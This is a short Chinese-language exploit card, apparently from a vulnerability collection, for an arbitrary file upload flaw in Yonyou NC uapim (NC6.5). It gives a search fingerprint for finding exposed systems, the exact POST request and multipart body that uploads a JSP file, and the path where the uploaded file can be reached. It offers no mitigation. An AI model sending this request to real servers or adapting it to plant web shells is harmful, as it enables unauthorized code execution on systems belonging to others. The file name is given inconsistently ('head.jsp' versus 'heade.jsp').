# 用友NCuapim任意文件上传

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`POST /uapim/upload/grouptemplet?groupid=abc&fileType=jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 122`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="test.jsp"
test
--00content0boundary00--

上传文件位置：`/uapim/static/pages/abc/head.jsp`,其中`heade.jsp`为固定文件。\
```

**其他**
- 用友NC uapim任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC6.5